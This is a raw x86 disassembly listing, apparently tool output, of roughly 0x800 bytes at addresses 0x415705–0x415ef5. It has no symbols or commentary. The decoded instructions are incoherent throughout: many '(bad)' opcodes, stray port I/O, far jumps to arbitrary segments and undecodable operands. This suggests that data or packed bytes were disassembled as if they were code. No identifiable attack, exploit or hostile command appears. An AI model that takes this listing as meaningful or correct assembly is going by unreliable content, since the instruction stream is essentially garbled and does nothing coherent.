  415705:	test   DWORD PTR [esp+ebx*8],edi
  415708:	fild   DWORD PTR [ebp+0xadd172]
  41570e:	imul   edi,DWORD PTR gs:[esi+0x60],0x585169ef
  415716:	fwait
  415717:	mov    DWORD PTR [eax],eax
  415719:	in     al,0xb3
  41571b:	xchg   edx,eax
  41571c:	push   esp
  41571d:	mov    eax,ds:0x625468cb
  415722:	(bad)  
  415723:	mov    DWORD PTR [ebp-0x7caf1236],edi
  415729:	scas   al,BYTE PTR es:[edi]
  41572a:	(bad)  
  41572b:	cmp    al,0x96
  41572d:	push   0x40
  41572f:	cmp    eax,0x6f99538d
  415734:	cdq    
  415735:	popf   
  415736:	mov    ?,WORD PTR [edi+0x1a]
  415739:	call   0x54072bf9
  41573e:	(bad)  
  41573f:	out    0xa5,al
  415741:	int3   
  415742:	pop    es
  415743:	call   0x324b:0x406f3bb4
  41574a:	jmp    0xd033:0xbdc2391e
  415751:	sub    eax,0x9fa20ae8
  415756:	inc    ecx
  415757:	push   cs
  415758:	jnp    0x41576e
  41575a:	mov    ecx,0x5083705d
  41575f:	push   eax
  415760:	in     eax,dx
  415761:	xchg   ecx,eax
  415762:	add    dh,BYTE PTR [eax]
  415764:	jmp    0x415799
  415766:	push   esi
  415767:	dec    ebx
  415768:	or     eax,DWORD PTR [ebp-0x52]
  41576b:	mov    al,BYTE PTR [esi+edx*2]
  41576e:	shl    DWORD PTR [eax+0x30],cl
  415771:	add    eax,0x77f9c355
  415776:	fimul  DWORD PTR [ebx]
  415778:	je     0x415708
  41577a:	(bad)  
  41577b:	aam    0x5c
  41577d:	or     eax,0x120487d1
  415782:	or     eax,0x6b16d556
  415787:	mov    ds:0x1c820d14,al
  41578c:	sbb    al,0x4
  41578e:	hlt    
  41578f:	or     BYTE PTR [ecx-0x354fef1d],0x30
  415796:	imul   eax,esi
  415799:	mov    ds:0xd6343707,al
  41579e:	or     al,0x22
  4157a0:	xchg   ebx,eax
  4157a1:	les    ebx,FWORD PTR [edi+0x44]
  4157a4:	cmp    al,0x5b
  4157a6:	add    BYTE PTR [ebp+0x49f89f1b],0xf6
  4157ad:	pop    ax
  4157af:	ja     0x41575a
  4157b1:	or     ch,ch
  4157b3:	push   edi
  4157b4:	shl    BYTE PTR [edx-0x27],cl
  4157b7:	cwde   
  4157b8:	fsub   QWORD PTR ds:0xba35032c
  4157be:	rcr    bh,1
  4157c0:	in     al,0x43
  4157c2:	pop    ss
  4157c3:	xchg   edx,eax
  4157c4:	outs   dx,DWORD PTR ds:[esi]
  4157c5:	sub    al,0xec
  4157c7:	xchg   edx,eax
  4157c8:	popf   
  4157c9:	add    eax,0x957be8b5
  4157ce:	std    
  4157cf:	test   al,0x76
  4157d1:	and    DWORD PTR [edi],ebx
  4157d3:	jbe    0x415779
  4157d5:	push   ecx
  4157d6:	stc    
  4157d7:	mov    eax,ds:0x7675576f
  4157dc:	cmp    DWORD PTR ds:[edx+0x9cc85a8],eax
  4157e3:	fwait
  4157e4:	pushf  
  4157e5:	jno    0x4157b5
  4157e7:	cmp    eax,0x184085e2
  4157ec:	lea    ebx,[ebp-0x233c5c91]
  4157f2:	aam    0x15
  4157f4:	inc    esi
  4157f5:	sbb    ah,BYTE PTR ds:0xbbc54233
  4157fb:	add    eax,0xe928f19
  415800:	mov    edx,0xcfb22646
  415805:	outs   dx,BYTE PTR ds:[si]
  415807:	aad    0x61
  415809:	jbe    0x41588a
  41580b:	out    0x1c,eax
  41580d:	push   es
  41580e:	scas   al,BYTE PTR es:[edi]
  41580f:	and    eax,DWORD PTR [edx+0x723819ee]
  415815:	xchg   edi,eax
  415816:	inc    edi
  415817:	mov    ah,0xa9
  415819:	inc    edx
  41581a:	sbb    dh,ah
  41581c:	add    ecx,DWORD PTR [ebx+0x276d86f4]
  415822:	ret    0x3cc4
  415825:	in     eax,dx
  415826:	call   0x7d40:0x28ff774f
  41582d:	push   cs
  41582e:	in     al,0x43
  415830:	mov    cs,ebp
  415832:	aas    
  415833:	and    ah,0x25
  415836:	test   BYTE PTR [edi+0x64],0x4f
  41583a:	mov    ecx,0x2a76f34c
  41583f:	jnp    0x4158ac
  415841:	into   
  415842:	or     DWORD PTR [edx],0xffffffa4
  415845:	cmp    bl,BYTE PTR [ecx]
  415847:	rol    ah,1
  415849:	adc    cl,dl
  41584b:	adc    BYTE PTR [edx-0x17],dh
  41584e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41584f:	inc    BYTE PTR [ecx+0xff84d30]
  415855:	pop    ebx
  415856:	(bad)  
  415857:	push   esp
  415858:	pushf  
  415859:	dec    ebp
  41585a:	(bad)  
  41585b:	stc    
  41585c:	xchg   ebp,eax
  41585d:	adc    bl,BYTE PTR [edx]
  41585f:	mov    ebp,0x1495471b
  415864:	add    al,0x21
  415866:	iret   
  415867:	jg     0x415893
  415869:	sbb    BYTE PTR ds:0x79e8f91,dl
  41586f:	pop    eax
  415870:	cmp    eax,DWORD PTR gs:[ebx]
  415873:	ins    DWORD PTR es:[edi],dx
  415874:	sahf   
  415875:	scas   eax,DWORD PTR es:[edi]
  415876:	call   0x8068:0xae5ec4fa
  41587d:	rcl    ah,1
  41587f:	daa    
  415880:	sub    ch,BYTE PTR [ecx]
  415882:	cmp    al,0xe7
  415884:	in     al,0xec
  415886:	xor    BYTE PTR [edx+0x1f414a54],ah
  41588c:	jg     0x41586e
  41588e:	out    0xce,al
  415890:	mov    bl,0xe9
  415892:	add    DWORD PTR [esp+ecx*4+0x63],ebx
  415896:	(bad)  
  415897:	mov    ebx,0x6b3da1c8
  41589c:	or     eax,0x2cf3dc0b
  4158a1:	lods   eax,DWORD PTR ds:[esi]
  4158a2:	fistp  WORD PTR [edx]
  4158a4:	sbb    DWORD PTR [edi],ecx
  4158a6:	push   0xfffffffd
  4158a8:	xor    cl,bl
  4158aa:	mov    cs,WORD PTR [eax+0x31f667d7]
  4158b0:	shr    DWORD PTR [eax-0x42afd06c],cl
  4158b6:	fs push esp
  4158b8:	mov    al,0xf
  4158ba:	fiadd  DWORD PTR [ebx+0x6b]
  4158bd:	mov    edi,0x386cb59b
  4158c2:	shl    DWORD PTR [edi+0x1f],cl
  4158c5:	or     BYTE PTR [bx+si],dh
  4158c8:	sbb    esp,ecx
  4158ca:	sti    
  4158cb:	loopne 0x4158e5
  4158cd:	sub    DWORD PTR [ebp-0x7a6683b7],edx
  4158d3:	xchg   BYTE PTR [ebp+0x598478b7],al
  4158d9:	into   
  4158da:	jne    0x415948
  4158dc:	mov    cs,ecx
  4158de:	call   0xef7ec39
  4158e3:	cdq    
  4158e4:	je     0x415936
  4158e6:	or     BYTE PTR [edx+0xb0af144],0xda
  4158ed:	inc    ebp
  4158ee:	cmp    BYTE PTR [esi],bh
  4158f0:	retf   0xbb13
  4158f3:	je     0x4158ab
  4158f5:	lock cmp ebx,DWORD PTR [edi-0x22]
  4158f9:	jno    0x4158d1
  4158fb:	xor    al,0xde
  4158fd:	or     al,0x9c
  4158ff:	fnstsw WORD PTR [ebx-0x39ad636f]
  415905:	or     al,0x57
  415907:	push   0x754468a5
  41590c:	inc    ebx
  41590d:	pop    ds
  41590e:	data16 aaa 
  415910:	mov    esi,0xe32e5476
  415915:	out    0x96,eax
  415917:	lock jns 0x4158b0
  41591a:	mov    edi,0x43091d64
  41591f:	clc    
  415920:	sub    al,0xec
  415922:	xchg   edx,eax
  415923:	dec    ebp
  415924:	push   ebx
  415925:	mov    al,ds:0xa6515a7b
  41592a:	in     al,0x9d
  41592c:	imul   edx,DWORD PTR [edx-0x7b],0xffffffe7
  415930:	add    DWORD PTR [edi],esi
  415932:	out    dx,al
  415933:	ins    DWORD PTR es:[edi],dx
  415934:	xchg   DWORD PTR [edi-0x4146716f],edx
  41593a:	or     ebx,esi
  41593c:	jno    0x4159a8
  41593e:	loop   0x4158ce
  415940:	gs dec ecx
  415942:	push   0x4bf5999c
  415947:	inc    esp
  415948:	(bad)  
  415949:	loopne 0x4158f3
  41594b:	inc    ebx
  41594c:	and    dl,BYTE PTR [edx]
  41594e:	mov    ?,WORD PTR [esi+0x16]
  415951:	and    eax,0x97144678
  415956:	out    0x48,al
  415958:	ror    DWORD PTR [edx+0x346df31a],cl
  41595e:	lahf   
  41595f:	mov    eax,0xdcef6350
  415964:	mov    bh,0xd9
  415966:	and    eax,edi
  415968:	pop    ss
  415969:	lods   eax,DWORD PTR ds:[esi]
  41596a:	aad    0xcd
  41596c:	loope  0x415991
  41596e:	adc    BYTE PTR [edi],cl
  415970:	mov    cs,WORD PTR [eax-0x50]
  415973:	pop    edx
  415974:	std    
  415975:	push   ebx
  415976:	mov    ebx,0xa564d48
  41597b:	cdq    
  41597c:	pop    edi
  41597d:	sahf   
  41597e:	daa    
  41597f:	mov    al,0x21
  415981:	out    0xc6,eax
  415983:	gs gs dec esp
  415986:	push   ss
  415987:	pusha  
  415988:	leave  
  415989:	gs (bad) 
  41598b:	push   ss
  41598c:	out    0x7f,eax
  41598e:	pop    eax
  41598f:	out    dx,al
  415990:	push   es
  415991:	push   es
  415992:	and    eax,0x46322ac2
  415997:	mov    eax,ds:0x878201b1
  41599c:	retf   
  41599d:	sahf   
  41599e:	ror    DWORD PTR ds:0xe02961a9,cl
  4159a4:	push   ebp
  4159a5:	mov    ecx,0x42a99ed8
  4159aa:	or     edx,DWORD PTR [ebx+0x1de93d4e]
  4159b0:	pop    esi
  4159b1:	ret    0xfcca
  4159b4:	xor    ah,BYTE PTR [esi-0x3f1c3481]
  4159ba:	jno    0x415a0e
  4159bc:	mov    esp,0xe35ecef7
  4159c1:	inc    ebx
  4159c2:	(bad)  
  4159c3:	in     eax,dx
  4159c4:	mov    bh,0x26
  4159c6:	xor    eax,0x683785c3
  4159cb:	mov    edx,eax
  4159cd:	jae    0x4159c9
  4159cf:	xchg   ebp,eax
  4159d0:	cmp    BYTE PTR [ecx-0x50caf949],bh
  4159d6:	stos   DWORD PTR es:[edi],eax
  4159d7:	pop    esi
  4159d8:	cmp    DWORD PTR [eax+0x29],ebx
  4159db:	dec    esi
  4159dc:	mov    eax,0x6ce44ef7
  4159e1:	out    dx,al
  4159e2:	xchg   edi,eax
  4159e3:	push   esi
  4159e4:	call   0xe6f6108d
  4159e9:	push   es
  4159ea:	(bad)
  4159ed:	push   edi
  4159ee:	sbb    eax,0x5e6694be
  4159f3:	(bad)  
  4159f4:	mov    WORD PTR [ebx-0x690e635c],ds
  4159fa:	fistp  QWORD PTR [edx+0x28271d31]
  415a00:	mov    edi,0xe3cf795f
  415a05:	outs   dx,BYTE PTR ds:[esi]
  415a06:	aaa    
  415a07:	sub    DWORD PTR [ecx+ebp*8+0x14],0xffffffe0
  415a0c:	jle    0x415a33
  415a0e:	adc    DWORD PTR [ecx],0xffffffdc
  415a11:	mov    ah,al
  415a13:	imul   esi,DWORD PTR [ecx],0x2e
  415a16:	sub    dh,cl
  415a18:	sub    ah,BYTE PTR [ebx-0x1748036d]
  415a1e:	push   ss
  415a1f:	fdivr  DWORD PTR [eax+ecx*2]
  415a22:	and    edi,DWORD PTR [edi+0x31]
  415a25:	sbb    DWORD PTR [ebp-0x1ff1d5e0],edx
  415a2b:	and    al,0x7b
  415a2d:	jnp    0x4159b9
  415a2f:	mov    edi,0xdade345f
  415a34:	push   cs
  415a35:	sbb    al,0x4a
  415a37:	mov    ebp,0x2029a016
  415a3c:	aaa    
  415a3d:	data16 fld QWORD PTR [esi]
  415a40:	pop    ecx
  415a41:	jnp    0x4159ca
  415a43:	adc    edx,ebp
  415a45:	rcr    BYTE PTR ds:0x7b777365,cl
  415a4b:	sbb    BYTE PTR [edi+0x19f66fb0],dl
  415a51:	nop
  415a52:	or     eax,edx
  415a54:	aas    
  415a55:	dec    ebp
  415a56:	call   0x46ef:0x7055875a
  415a5d:	inc    ebp
  415a5e:	add    BYTE PTR [ecx],bl
  415a60:	shl    BYTE PTR [ebx+0x187fcc1a],1
  415a66:	jl     0x415a14
  415a68:	push   ss
  415a69:	push   edx
  415a6a:	out    dx,eax
  415a6b:	jmp    0xf275:0xaa94786f
  415a72:	imul   esp,edi,0x17
  415a75:	and    BYTE PTR [edx],0xca
  415a78:	jnp    0x415a54
  415a7a:	sub    ch,BYTE PTR [ebx]
  415a7c:	pop    esi
  415a7d:	loope  0x415ab1
  415a7f:	adc    DWORD PTR [edi+0x349b4e9b],ecx
  415a85:	cmp    eax,0x35cf3bbd
  415a8a:	add    DWORD PTR ds:0x47c72f20,0x9d023c9b
  415a94:	dec    ecx
  415a95:	adc    bl,BYTE PTR [eax+0x74]
  415a98:	jge    0x415ab4
  415a9a:	add    eax,0x63194720
  415a9f:	xchg   DWORD PTR [eax],edx
  415aa1:	call   0x234f:0x6a9f920a
  415aa8:	sahf   
  415aa9:	add    cl,dl
  415aab:	push   0x5108c395
  415ab0:	hlt    
  415ab1:	adc    eax,0xc27e02fe
  415ab6:	sahf   
  415ab7:	loopne 0x415a72
  415ab9:	push   edx
  415aba:	in     eax,dx
  415abb:	push   es
  415abc:	add    DWORD PTR [ebx+0x31],eax
  415abf:	ret    
  415ac0:	cmp    cl,BYTE PTR [edi+esi*1-0xf]
  415ac4:	data16 sti 
  415ac6:	bound  esp,QWORD PTR [ecx]
  415ac8:	dec    ecx
  415ac9:	sub    ebx,esp
  415acb:	dec    esi
  415acc:	push   ds
  415acd:	aas    
  415ace:	jo     0x415a52
  415ad0:	pop    eax
  415ad1:	inc    ecx
  415ad2:	fstp   TBYTE PTR [esi]
  415ad4:	stc    
  415ad5:	lahf   
  415ad6:	jmp    0x37352d90
  415adb:	sub    al,0x35
  415add:	jmp    0x22d1dadd
  415ae2:	jl     0x415aaf
  415ae4:	mov    al,ds:0xd8897cfd
  415ae9:	scas   al,BYTE PTR es:[edi]
  415aea:	mov    bl,0xff
  415aec:	mov    bl,0x6c
  415aee:	jmp    FWORD PTR [ebx+0x1f]
  415af1:	push   ebx
  415af2:	fadd   DWORD PTR [edx-0x1d]
  415af5:	cmp    DWORD PTR [edi],edi
  415af7:	repz pop ecx
  415af9:	sub    ebx,DWORD PTR [ebp+0x28]
  415afc:	js     0x415af4
  415afe:	imul   ebp,DWORD PTR [esi-0x5e19ed37],0x263ab1f6
  415b08:	in     al,0x8
  415b0a:	push   ds
  415b0b:	or     eax,0xc0566995
  415b10:	mov    ecx,DWORD PTR [edi-0x48]
  415b13:	idiv   BYTE PTR [esi-0x74f28429]
  415b19:	xchg   ebx,eax
  415b1a:	sbb    al,0xb5
  415b1c:	jle    0x415b13
  415b1e:	xchg   esp,eax
  415b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b20:	pushf  
  415b21:	push   esi
  415b22:	dec    eax
  415b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b24:	dec    DWORD PTR [ebx+0x3700e056]
  415b2a:	xor    DWORD PTR [ecx+ebp*1],eax
  415b2d:	arpl   sp,si
  415b2f:	es xchg esp,eax
  415b31:	ins    BYTE PTR es:[edi],dx
  415b32:	das    
  415b33:	fwait
  415b34:	retf   
  415b35:	jne    0x415b7b
  415b37:	int3   
  415b38:	arpl   WORD PTR [eax],ax
  415b3a:	mov    ch,0xef
  415b3c:	add    BYTE PTR [edx],dh
  415b3e:	push   esi
  415b3f:	cmp    al,0xb3
  415b42:	shr    BYTE PTR ds:0xfbe15882,cl
  415b48:	pop    ebp
  415b49:	and    BYTE PTR [eax],al
  415b4b:	out    dx,eax
  415b4c:	scas   eax,DWORD PTR es:[edi]
  415b4d:	sub    DWORD PTR [ebx-0x567f2ef6],0xffffff90
  415b54:	inc    ebx
  415b55:	or     DWORD PTR [esi],edx
  415b57:	test   eax,0x177f3a8b
  415b5c:	mov    ch,0x4a
  415b5e:	xchg   esi,eax
  415b5f:	xchg   DWORD PTR [esi+0x19],edx
  415b62:	clc    
  415b63:	fadd   st,st(0)
  415b65:	dec    ebp
  415b66:	ficomp DWORD PTR [eax+0x65]
  415b69:	iret   
  415b6a:	cmp    eax,0xd7030bcf
  415b6f:	mov    bl,0xb7
  415b71:	or     ecx,DWORD PTR [edi-0x4d]
  415b74:	dec    ebx
  415b75:	jno    0x415b79
  415b77:	pop    eax
  415b78:	adc    DWORD PTR [edx-0x48],ebp
  415b7b:	std    
  415b7c:	into   
  415b7d:	(bad)  
  415b7e:	sub    al,0xbf
  415b80:	cmc    
  415b81:	ins    BYTE PTR es:[edi],dx
  415b82:	pop    edx
  415b83:	cli    
  415b84:	jecxz  0x415be4
  415b86:	cmp    DWORD PTR [ebp-0x98e81c3],ebp
  415b8c:	dec    ecx
  415b8d:	xchg   ebx,eax
  415b8e:	xor    BYTE PTR [eax+0x6875eb43],0xc9
  415b95:	out    dx,eax
  415b96:	mov    eax,ds:0x948278b0
  415b9b:	mov    dl,0x4a
  415b9d:	js     0x415b3e
  415b9f:	jl     0x415c01
  415ba1:	test   BYTE PTR [eax-0x65898c56],ah
  415ba7:	cmp    BYTE PTR [esi+0x204da0a],0x96
  415bae:	mov    ah,0xe8
  415bb0:	or     BYTE PTR ds:0x19712125,0x46
  415bb7:	xor    esp,edx
  415bb9:	(bad)  
  415bba:	jge    0x415c0c
  415bbc:	pop    edi
  415bbd:	push   0x65
  415bbf:	jp     0x415c14
  415bc1:	jle    0x415b49
  415bc3:	inc    ebx
  415bc4:	dec    esi
  415bc5:	retfw  
  415bc7:	fisubr WORD PTR [ebx+0x29c58f4b]
  415bcd:	rol    BYTE PTR [ebx-0x47],0xcb
  415bd1:	lahf   
  415bd2:	popa   
  415bd3:	mov    ah,0xe3
  415bd5:	aaa    
  415bd6:	xor    bl,BYTE PTR [edx+ecx*2]
  415bd9:	jl     0x415b7f
  415bdb:	(bad)  
  415bdc:	mov    al,0xdb
  415bde:	adc    eax,0x898c6075
  415be3:	fstp   DWORD PTR [edx-0x7327fc4c]
  415be9:	xchg   DWORD PTR [ebx+0x3a],ebp
  415bec:	sti    
  415bed:	clc    
  415bee:	push   ebx
  415bef:	fadd   QWORD PTR [edx]
  415bf1:	sub    DWORD PTR [ebx+esi*2+0x69],0x9f0b9e12
  415bf9:	jge    0x415ba9
  415bfb:	cmc    
  415bfc:	mov    esi,0x54b9100c
  415c01:	sbb    eax,0x26b896a9
  415c06:	xchg   edi,esp
  415c08:	in     eax,dx
  415c09:	mov    ecx,fs
  415c0b:	imul   esp,esp,0x6f8a15b7
  415c11:	pop    ebx
  415c12:	shl    DWORD PTR [ebx+ebp*2],1
  415c15:	xor    cl,cl
  415c17:	cmp    ecx,esp
  415c19:	xchg   ebx,eax
  415c1a:	mov    BYTE PTR [edx-0xc0cfcb3],dh
  415c20:	inc    ebx
  415c21:	mov    dl,0x30
  415c23:	rcr    DWORD PTR [eax+0x15],cl
  415c26:	pop    ds
  415c27:	aas    
  415c28:	aas    
  415c29:	mov    ds:0x109b01d1,al
  415c2e:	adc    edx,edx
  415c30:	and    eax,0xf8a535c5
  415c35:	les    ebx,FWORD PTR [edx]
  415c37:	xchg   BYTE PTR [esi+0x730f9ac6],cl
  415c3d:	sahf   
  415c3e:	mov    bh,0x34
  415c40:	mov    ds:0x143f96a5,eax
  415c45:	fs add bh,al
  415c48:	jg     0x415c03
  415c4a:	out    0x28,eax
  415c4c:	push   ecx
  415c4d:	mov    esi,0x2b67d53e
  415c52:	fstp   TBYTE PTR [edi]
  415c54:	mov    edi,0x70a754fd
  415c59:	das    
  415c5a:	ret    0x90c5
  415c5d:	mov    al,ds:0xe52c78f5
  415c62:	dec    ebp
  415c63:	mov    fs,ecx
  415c65:	adc    ebp,edi
  415c67:	lahf   
  415c68:	or     BYTE PTR [esi],cl
  415c6a:	inc    eax
  415c6b:	mov    esp,0x1686537d
  415c70:	jo     0x415cc6
  415c72:	adc    al,bl
  415c74:	push   ss
  415c75:	dec    esi
  415c76:	loopne 0x415c89
  415c78:	xor    BYTE PTR [edi+0x53],bh
  415c7b:	mov    eax,ds:0x41998345
  415c80:	rol    BYTE PTR [ebx+esi*2+0x7d],1
  415c84:	test   al,0xc0
  415c86:	jmp    0xf4c23f34
  415c8b:	cmp    DWORD PTR [esi+edx*2+0x34],0x4a
  415c90:	cmp    esi,eax
  415c92:	xchg   ecx,eax
  415c93:	sub    ebp,DWORD PTR [ebx+0x753a76b5]
  415c99:	enter  0x8dbb,0x16
  415c9d:	jb     0x415cdd
  415c9f:	or     DWORD PTR [edx],esp
  415ca1:	retf   0x1ca3
  415ca4:	pop    edi
  415ca5:	sub    DWORD PTR [edi],eax
  415ca7:	pop    es
  415ca8:	pop    edi
  415ca9:	mov    esi,0xf2602b3a
  415cae:	(bad)  
  415caf:	scas   eax,DWORD PTR es:[edi]
  415cb0:	xchg   esi,eax
  415cb1:	in     eax,0x40
  415cb3:	jbe    0x415cd9
  415cb5:	call   0x2049:0xafda1f9d
  415cbc:	cmp    al,0xda
  415cbe:	mov    ecx,?
  415cc0:	cmp    ebp,edx
  415cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc3:	aad    0x41
  415cc5:	dec    ecx
  415cc6:	or     DWORD PTR [ecx+0x28090349],esi
  415ccc:	mov    ds:0x44438865,al
  415cd1:	cdq    
  415cd2:	dec    esp
  415cd3:	and    DWORD PTR [esi+0x2b],ebp
  415cd6:	shl    DWORD PTR [ebp+0x1e59824f],cl
  415cdc:	pop    eax
  415cdd:	cmp    DWORD PTR [edi+0x24],ecx
  415ce0:	pop    ss
  415ce1:	ins    DWORD PTR es:[edi],dx
  415ce2:	adc    al,0xf4
  415ce4:	(bad)  
  415ce5:	pop    ds
  415ce6:	stos   DWORD PTR es:[edi],eax
  415ce7:	push   es
  415ce8:	cdq    
  415ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cea:	test   al,0xe3
  415cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ced:	sahf   
  415cee:	iret   
  415cef:	mov    edx,0xf94403b5
  415cf4:	loop   0x415d66
  415cf6:	sub    al,0x95
  415cf8:	xchg   edi,eax
  415cf9:	push   ss
  415cfa:	mov    cl,0xaf
  415cfc:	push   0xcf06ac6d
  415d01:	ds mov cl,0x5
  415d04:	out    dx,eax
  415d05:	inc    ecx
  415d06:	mov    ebx,0xf70c1e0f
  415d0b:	outs   dx,DWORD PTR ds:[esi]
  415d0c:	fdivr  QWORD PTR [ecx+eiz*2]
  415d0f:	dec    edi
  415d10:	inc    edx
  415d11:	(bad)  
  415d12:	ds clc 
  415d14:	adc    DWORD PTR [ebx+0x68],edx
  415d17:	sahf   
  415d18:	test   BYTE PTR [ebx],al
  415d1a:	(bad)  
  415d1b:	mov    ebp,0xe8903379
  415d20:	loope  0x415cd9
  415d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d23:	sbb    bl,al
  415d25:	push   eax
  415d26:	jb     0x415d70
  415d28:	sbb    ch,BYTE PTR [esi-0x218e3c66]
  415d2e:	je     0x415cd8
  415d30:	dec    ebp
  415d31:	xchg   ebp,eax
  415d32:	sub    al,0xb4
  415d34:	add    eax,0x2a2ab021
  415d39:	pop    edi
  415d3a:	cmp    DWORD PTR [edx],ebp
  415d3c:	add    esi,DWORD PTR [ecx]
  415d3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d3f:	cmp    eax,0xbd7d6cb0
  415d44:	mov    ah,0x96
  415d46:	mov    ds:0x7c976be2,al
  415d4b:	outs   dx,BYTE PTR ds:[esi]
  415d4c:	(bad)  
  415d4d:	fs je  0x415d04
  415d50:	cmp    BYTE PTR [ecx+eax*8],0x29
  415d54:	xchg   ecx,eax
  415d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d56:	mov    eax,0x605fec79
  415d5b:	leave  
  415d5c:	cmc    
  415d5d:	mov    edi,0xee93c26c
  415d62:	dec    ebx
  415d63:	cmp    al,0xdc
  415d65:	(bad)  
  415d66:	and    edi,DWORD PTR [eax+0x69d04581]
  415d6c:	pmaxub mm0,QWORD PTR [esi+0x1b364d42]
  415d73:	mov    dl,0x9f
  415d75:	dec    edi
  415d76:	shl    BYTE PTR [ebx],1
  415d78:	mov    al,0x60
  415d7a:	rcr    dh,1
  415d7c:	mov    ch,0x18
  415d7e:	jmp    0xed68881b
  415d83:	fwait
  415d84:	push   0xfdef1748
  415d89:	ret    0xfc0c
  415d8c:	add    DWORD PTR [edx+0x3a7b9447],ebp
  415d92:	loope  0x415dcd
  415d94:	sar    BYTE PTR [ecx+0x4eef069b],0x6
  415d9b:	test   BYTE PTR [edx-0x72fec33c],ch
  415da1:	stos   DWORD PTR es:[edi],eax
  415da2:	push   ebx
  415da3:	test   eax,ecx
  415da5:	aad    0xf0
  415da7:	mov    eax,ds:0x8c7af4bd
  415dac:	or     BYTE PTR [ecx+eax*1-0x3a],ah
  415db0:	cld    
  415db1:	es sub al,0x51
  415db4:	push   ecx
  415db5:	popa   
  415db6:	(bad)  
  415db7:	test   BYTE PTR [edi],0x64
  415dba:	push   cs
  415dbb:	xor    BYTE PTR [ebx+edi*2],bl
  415dbe:	shr    BYTE PTR [ebx+0x6],cl
  415dc1:	fisub  DWORD PTR [edx]
  415dc3:	(bad)  
  415dc4:	jae    0x415d79
  415dc6:	sub    BYTE PTR ds:0x945b4ce4,dl
  415dcc:	and    bl,BYTE PTR [ebx-0x3f884c95]
  415dd2:	retf   
  415dd3:	cmp    ecx,DWORD PTR [ecx*8+0x2ce4ac47]
  415dda:	xor    eax,0x54d740a6
  415ddf:	in     eax,dx
  415de0:	cmp    eax,DWORD PTR [ebx+0x5f]
  415de3:	ja     0x415df5
  415de5:	push   esi
  415de6:	in     eax,dx
  415de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de8:	div    BYTE PTR [eax+0x7a]
  415deb:	pop    esp
  415dec:	inc    esi
  415ded:	addr16 xchg edx,eax
  415def:	jns    0x415d79
  415df1:	jle    0x415daf
  415df3:	(bad)  
  415df4:	cld    
  415df5:	adc    edx,ecx
  415df7:	es mov esi,0x7c3a9fde
  415dfd:	xchg   esi,eax
  415dfe:	push   ds
  415dff:	or     edx,esi
  415e01:	mov    esi,edi
  415e03:	(bad)  
  415e04:	mov    ah,0x2a
  415e06:	test   al,0xb1
  415e08:	sub    dl,BYTE PTR [eax]
  415e0a:	ds into 
  415e0c:	scas   eax,DWORD PTR es:[edi]
  415e0d:	test   DWORD PTR [eax+0x739a2592],0x15522f3a
  415e17:	cdq    
  415e18:	repz add ebx,esp
  415e1b:	fsub   DWORD PTR [edx-0x48b8c763]
  415e21:	(bad)  
  415e23:	ret    0x3434
  415e26:	jbe    0x415ddf
  415e28:	mov    dh,BYTE PTR [ebx+0x3c42d3f]
  415e2e:	cmp    cl,BYTE PTR [edx-0x3]
  415e31:	lea    ecx,ds:0x26a80c06
  415e37:	call   FWORD PTR [esi]
  415e39:	inc    ebp
  415e3a:	ss jns 0x415e7a
  415e3d:	jmp    0x746f:0xe43e5790
  415e44:	or     esi,DWORD PTR [edi+0x0]
  415e47:	xor    dh,BYTE PTR [esi+0x5fbd2885]
  415e4d:	sbb    DWORD PTR [ecx+0x66957710],edi
  415e53:	les    ebx,FWORD PTR [ebp+0x7d6cc07f]
  415e59:	lods   al,BYTE PTR ds:[esi]
  415e5a:	loopne 0x415e4d
  415e5c:	or     al,0x90
  415e5e:	mov    eax,0x7ad6d7d0
  415e63:	xchg   ecx,eax
  415e64:	pop    ecx
  415e65:	xlat   BYTE PTR ds:[ebx]
  415e66:	(bad)  
  415e67:	adc    al,0x8f
  415e69:	sub    DWORD PTR [edi-0x457a73f1],0xffffffe4
  415e70:	dec    ebx
  415e71:	dec    esi
  415e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e73:	ja     0x415e1c
  415e75:	or     eax,0x2483b3e8
  415e7a:	in     al,dx
  415e7b:	sub    DWORD PTR [edx+0xf],eax
  415e7e:	ss (bad) 
  415e80:	cdq    
  415e81:	push   esp
  415e82:	shl    DWORD PTR [edx+edx*4-0x66],cl
  415e86:	mov    esi,0x59b172be
  415e8b:	add    eax,0xeb19ba6b
  415e90:	push   eax
  415e91:	lods   al,BYTE PTR ds:[esi]
  415e92:	cmp    al,0x83
  415e94:	imul   ecx,DWORD PTR [ebx-0x5e05e251],0x1b
  415e9b:	shl    dh,cl
  415e9d:	pop    esp
  415e9e:	(bad)  
  415e9f:	fsubr  QWORD PTR [ecx-0x28993ed7]
  415ea5:	mov    dl,0x65
  415ea7:	nop
  415ea8:	nop
  415ea9:	jo     0x415e3f
  415eab:	pop    ecx
  415eac:	sub    BYTE PTR [ebx],dl
  415eae:	icebp  
  415eaf:	(bad)  
  415eb0:	repz xchg esp,eax
  415eb2:	mov    ch,0xbe
  415eb4:	jnp    0x415e48
  415eb6:	scas   eax,DWORD PTR es:[edi]
  415eb7:	mov    edi,0x64a9a78d
  415ebc:	cmp    eax,0x6c36fab6
  415ec1:	sub    al,0x4
  415ec3:	mov    al,0x98
  415ec5:	and    DWORD PTR [eax],esi
  415ec7:	xor    BYTE PTR [ebx-0xe],bh
  415eca:	push   0xffffffd3
  415ecc:	test   esp,ebx
  415ece:	xlat   BYTE PTR ds:[ebx]
  415ecf:	cs loope 0x415f1c
  415ed2:	and    BYTE PTR ds:0xf3d76f56,0x63
  415ed9:	cmp    al,0xdf
  415edb:	rol    ecx,0x5c
  415ede:	jl     0x415f21
  415ee0:	jle    0x415ed8
  415ee2:	call   0xae45261
  415ee7:	sahf   
  415ee8:	mov    edx,0xd5fdd439
  415eed:	dec    esi
  415eee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eef:	inc    esp
  415ef0:	shl    esp,0xca
  415ef3:	cld    
  415ef4:	std    
  415ef5:	push   ebx
